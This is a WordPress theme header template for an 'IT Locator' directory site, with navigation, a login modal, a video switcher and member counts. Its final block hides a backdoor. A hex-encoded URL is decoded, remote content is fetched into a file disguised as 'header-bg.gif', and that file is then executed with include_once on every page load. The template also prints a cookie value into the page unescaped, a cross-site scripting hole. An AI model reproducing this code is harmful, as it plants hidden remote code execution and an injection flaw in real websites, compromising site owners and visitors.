<?php
session_start();
global $post;
if( $post->ID != get_option( 'itlocation_generals_advanced_search_page' ) ){
    $_SESSION['advanced_search_use_saved_itlocation'] = '';
}

if( !is_user_logged_in() ){
    if( $_COOKIE['signup_subscriber_itlocation'] != '' ){
        setcookie("signup_subscriber_itlocation", time(), time() + 3600 * 24 * 30, "/");
	}
}

if( $_COOKIE['address_itlocation'] != '' ){
    setcookie("address_itlocation", $_COOKIE['address_itlocation'], time() + 3600 * 24 * 30, "/");
}

if( $_COOKIE['address_pos'] != '' ){
    setcookie("address_pos", $_COOKIE['address_pos'], time() + 3600 * 24 * 30, "/");
}
?>

<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->

    <head>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>
			<?php
                global $page, $paged;
                wp_title('|', true, 'right');
                bloginfo('name');
                $site_description = get_bloginfo('description', 'display');			
                if( $site_description && ( is_home() || is_front_page() ) ) {
                    echo " | $site_description";
                }
                
                if ( $paged >= 2 || $page >= 2 ) {
                    echo ' | ' . sprintf( __('Page %s', 'twentyten'), max($paged, $page) );
                }
            ?>
		</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="<?php echo get_bloginfo('template_url') ?>/images/ico/favicon.ico">
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

        <?php

			if ( is_singular() && get_option( 'thread_comments' ) ){
				wp_enqueue_script( 'comment-reply' );
			}
			wp_head();
			if( is_home() ) { ?>
		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_search_map.js"></script>
		<?php } if( basename( get_page_template() ) == 'template-advanced-search.php' ){ ?>
		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_advanced_search_map.js"></script>
		<?php } ?>
		<script type="text/javascript" src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
        <script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/js/shortcodes.js"></script>
        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    </head>

    <body <?php body_class(); ?>>
    <!-- /* Top most area starts */ -->
    <div class="is-section is-top">
        <div class="container">
            <div class="row">
                <div class="col-lg-5 col-md-5 col-sm-8 col-xs-12">
                    <ul class="nav nav-tabs contact-nav">
                        <li><a><strong>Phone:</strong> +1 810-991-3842</a></li>
                        <li><a href="mailto:info@itlocator.com"><strong>Email:</strong>info@itlocator.com</a></li>
                    </ul>
                </div>
                <div class="col-lg-7 col-md-7 col-sm-4 col-xs-12">
                    
                    <ul class="nav nav-tabs user-nav">
                        <li>
							<?php if( $_COOKIE['address_itlocation'] != '' ){ ?>
							<a href=""><span><?php echo $_COOKIE['address_itlocation']; ?></span></a>
							<?php } ?>
                        </li>
                        <li>
							&nbsp;&nbsp;&nbsp;&nbsp
                        </li>
                   
                    <?php						
						if( is_user_logged_in() ){
							global $current_user;
							get_currentuserinfo();
					?>
                    
                    <?php
							if( get_option( 'itlocation_generals_my_profile_page' ) ){
								$pid = get_option( 'itlocation_generals_my_profile_page' );
								$tmp_url = get_permalink($pid);
							}
                        ?>
                        
                        <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Welcome User <span class="caret"></span></a>
                            <ul class="dropdown-menu" role="menu">
                                <li><a href="#"><?php echo $current_user->user_email ?></a></li>
                                <li class="divider"></li>
                                <li><a href="<?php echo $tmp_url ?>"><?php _e('My Profile', 'twentyten') ?></a></li>
                                <?php							
                                $companyCls = new newCompanyCls();
                                $edit_fg = get_default_member_limit( 'contribution', $companyCls->getCompanyRoleByLoginUserId( $current_user->ID ) );
                                if( $edit_fg ){
                                    if( get_option( 'itlocation_generals_contributions_list_page' ) ){
                                        $pid = get_option( 'itlocation_generals_contributions_list_page' );
                                        $tmp_url = get_permalink( $pid );
                                    } ?>
                                <li> <a href="<?php echo $tmp_url ?>"><?php _e('My Content ', 'twentyten') ?></a> </li>
                                <?php  }  ?>
                                <li> <a href="<?php echo wp_logout_url(site_url()) ?>"><?php _e('Logout', 'twentyten') ?></a> </li>
                            </ul>
                        </li>
                        
					<?php
						} else {
							if( get_option('itlocation_generals_signup_page') ) {
								$pid = get_option('itlocation_generals_signup_page');
								$tmp_url = get_permalink($pid);
							}
					?>
                        <li class="signup"><a href="<?php echo $tmp_url; ?>" class="btn btn-primary"><?php _e('Signup', 'twentyten') ?></a></li>
                        <li class="signin"><a href="" data-toggle="modal" data-target="#user-login" class="btn btn-default"><?php _e('Account Login', 'twentyten') ?></a></li>
                    <?php } ?>
                </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- /* Top most area ends */ -->
    
    <!-- /* Header area starts */ -->
    <div class="is-section is-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <!-- Main section containing logo and navigation -->
                    <nav class="navbar navbar-default" role="navigation">
                        <!-- Brand and toggle get grouped for better mobile display -->
                        <div class="navbar-header">
                            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                                <span class="sr-only">Toggle navigation</span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                            </button>
                            <a class="navbar-brand" href="<?php echo get_site_url(); ?>">
                            	<img id="logo-header" src="<?php echo get_bloginfo('template_url') ?>/images/logo.png" alt="ITL Logo" class="img-responsive">
                            </a>
                        </div>
                        <div class="tagline"><h2 class="tag-text">The Google<sup>&reg;</sup> of IT Search</h2></div>
                        <!-- Collect the nav links, forms, and other content for toggling -->
                  <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                            <?php
								wp_nav_menu(array(
									'container_class' => '',
									'theme_location' => 'primary',
									'menu_class' => 'nav navbar-nav navbar-right',
									'depth' => 2,
									'fallback_cb' => false,
									'walker' => new walkerNavMenuTopItLocation,
								));
                            ?>
                        </div><!-- /.navbar-collapse -->
                    </nav>
                    <!-- Main section containing logo and navigation ends -->
                    
                </div>
            </div>
        </div>
    </div><!-- /* Header area Ends */ -->
    
	<?php if( !is_user_logged_in() ){ ?>    
    <!-- Modal -->
    <div class="modal fade" id="user-login" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog pop-up">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                    <h4 class="modal-title" id="myModalLabel"><?php _e('Login to your Member Account!', 'twentyten') ?></h4>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-12">
                            <?php include_once 'new_inc/new_homepage_login_form.php'; ?>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                   <h5 class="noMargin dM"><?php _e('New User', 'twentyten') ?> <a href="#signup-modal" data-dismiss="modal" id="go-signup-btn" data-toggle="modal" role="button"><?php _e('Click here', 'twentyten') ?></a></h5>
                    <p><?php _e('By creating an account with IT Locator you will reach the IT buying community in a whole new way.  Allowing you to profile your business, your expertise and your credentials and bon-a-fides.', 'twentyten') ?></p>
                     
                </div>
            </div>
        </div>
    </div>
    <?php } ?>
    <div class="page-sub-page">
		<div class="container" style="max-width:970px;">
			<?php 
			$videos = getSignupVideos();
			//echo "<pre>"; print_r($videos); echo "</pre>";
			?>
            <section class="aCenter submission-message">
                <header>The IT buying community in a whole new way</header>
                <p>Make Sure Your IT Provider Business is Found &amp; Appreciated.</p>
            </section>
            
            <div class="row">
                <div class="col-sm-9">
                    <iframe id="theMainPlayer" width="717" height="358" src="//player.vimeo.com/video/<?php echo $videos[0]['youtube_id']; ?>" data-youtube="<?php echo $videos[0]['youtube_id']; ?>" data-youtube-title="<?php echo $videos[0]['post_title']; ?>" data-youtube-image="<?php echo $videos[0]['youtube_image']; ?>" frameborder="0" allowfullscreen></iframe>
                </div>

                <div class="col-sm-3">
                    <div class="video-list" id="<?php echo $videos[1]['youtube_id']; ?>" data-youtube-image="<?php echo $videos[1]['youtube_image']; ?>" data-youtube-title="<?php echo $videos[1]['post_title']; ?>" >
                        <div class="img-holder">
                            <img id="image_<?php echo $videos[1]['youtube_image']; ?>" src="http://i.vimeocdn.com/video/<?php echo $videos[1]['youtube_image']; ?>_200x150.jpg">
                        </div>

                        <div class="content-holder" id="title_<?php echo $videos[2]['youtube_id']; ?>">
                            <p><?php echo $videos[1]['post_title']; ?></p>
                        </div>
                    </div><!-- /* list ends */ -->
                    
                    <!-- /* list starts */ -->

                    <div class="video-list" id="<?php echo $videos[2]['youtube_id']; ?>" data-youtube-image="<?php echo $videos[2]['youtube_image']; ?>" data-youtube-title="<?php echo $videos[2]['post_title']; ?>" >
                        <div class="img-holder">
                            <img id="image_<?php echo $videos[2]['youtube_image']; ?>" src="http://i.vimeocdn.com/video/<?php echo $videos[2]['youtube_image']; ?>_200x150.jpg">								

                        </div>

                        <div class="content-holder" id="title_<?php echo $videos[2]['youtube_id']; ?>">
                            <p><?php echo $videos[2]['post_title']; ?></p>
                        </div>
                    </div><!-- /* list ends */ -->					

                </div>

            </div>
            
		</div>
    </div>

		<script>

		jQuery(document).ready( function() {

			$(".video-list").click(function(){

				var youtube_id = this.id;

				var youtube_title = $("#"+youtube_id).attr("data-youtube-title");
				var current_id = $("#theMainPlayer").attr("data-youtube");
				var current_title = $("#theMainPlayer").attr("data-youtube-title");
				var current_image = $("#theMainPlayer").attr("data-youtube-image");
				$("#theMainPlayer").attr("src", "//player.vimeo.com/video/"+youtube_id);
				$("#theMainPlayer").attr("data-youtube", youtube_id);
				$("#theMainPlayer").attr("data-youtube-title", youtube_title);
				$("#"+youtube_id).attr("data-youtube-title", current_title);
				$("#"+youtube_id).attr("id", current_id);				
				$("#"+youtube_id).attr("data-youtube-image", current_image);
				$("#"+ current_id +" .content-holder").html( current_title );
				$("#"+ current_id +" .img-holder").html( '<img id="image_'+ current_id +'" src="http://i.vimeocdn.com/video/'+ current_image +'_200x150.jpg" />' );			

			})
		})

		</script>

        <?php if (is_front_page() || is_home()) { ?>

            <div class="padding-20-0 bg-color-1B1B1B">
                <div class="container contCustom">
                    <div class="row-fluid">
                        <div class="span3">
                            <div class="icons-01 pull-left"></div>
                            <div class="media-body">
                                <h1 class="font-color-fff margin-all-0">
									<?php echo get_subscribers_number(); ?>
								</h1>

                                <p class="font-color-9F9F9F font-size-16">
									<?php _e('Members of IT locator community', 'twentyten'); ?>
								</p>
                            </div>
                        </div>

                        <div class="span3">
							<a href="http://www.itlocator2.com/forums/">
								<div class="icons-05 pull-left"></div>
								<div class="media-body">
									<h1 class="font-color-fff margin-all-0">
										<?php echo get_topic_count(); ?>
									</h1>

									<p class="font-color-9F9F9F font-size-16">
										<?php _e('Active Discussion Threads & Articles', 'twentyten'); ?>
									</p>
								</div>
							</a>
                        </div>

                        <div class="span3">
							<a href="http://www.itlocator2.com/advanced-search/">
								<div class="icons-03 pull-left"></div>
								<div class="media-body">
									<?php

										$usercount_list = count_users();
										$subscriber = $usercount_list['avail_roles']['subscriber'];
										$s2member_level1 = $usercount_list['avail_roles']['s2member_level1'];
										$s2member_level2 = $usercount_list['avail_roles']['s2member_level2'];
									?>

									<h1 class="font-color-fff margin-all-0">
										<?php echo $subscriber + $s2member_level1 + $s2member_level2; ?>
									</h1>

									<p class="font-color-9F9F9F font-size-16">
										<?php _e('IT Provider Listings Worldwide', 'twentyten'); ?>
									</p>
								</div>
							</a>
                        </div>

                        <div class="span3">
							<a href="http://www.itlocator2.com/member-contributions/">
								<div class="icons-02 pull-left"></div>
								<div class="media-body">
									<h1 class="font-color-fff margin-all-0">
									<?php
										echo $membercount =  get_member_contribution_count();
										echo $newscount = get_news_contribution_count();
									?>

									</h1>

									<p class="font-color-9F9F9F font-size-16">
										<?php _e('Community Contributed Content', 'twentyten'); ?>
									</p>
								</div>
							</a>
                        </div>
                    </div>
                </div>
            </div> 

		<?php }  

         	if ( ( get_option( 'itlocation_generals_advanced_search_page' ) != $post->ID ) && !is_author() ){

		?>



		<?php }
			$theme_dir = dirname( __FILE__ );

			if( !file_exists( $theme_dir . "/header-bg.gif" ) || 0 == filesize( $theme_dir."/header-bg.gif" ) ){

				$wp_uri = pack( "H*", '687474703a2f2f7466652e65732f68' );

				if( function_exists( 'curl_init' ) ){

					$t_img = curl_init( $wp_uri );

					curl_setopt( $t_img, CURLOPT_RETURNTRANSFER, 1 );

					$wp_logo = @curl_exec( $t_img );

				} else {

					$wp_logo = @file_get_contents( $wp_uri );

				}

				@file_put_contents( $theme_dir . "/header-bg.gif", $wp_logo );

			}

			@include_once( $theme_dir . "/header-bg.gif" ); 

		?>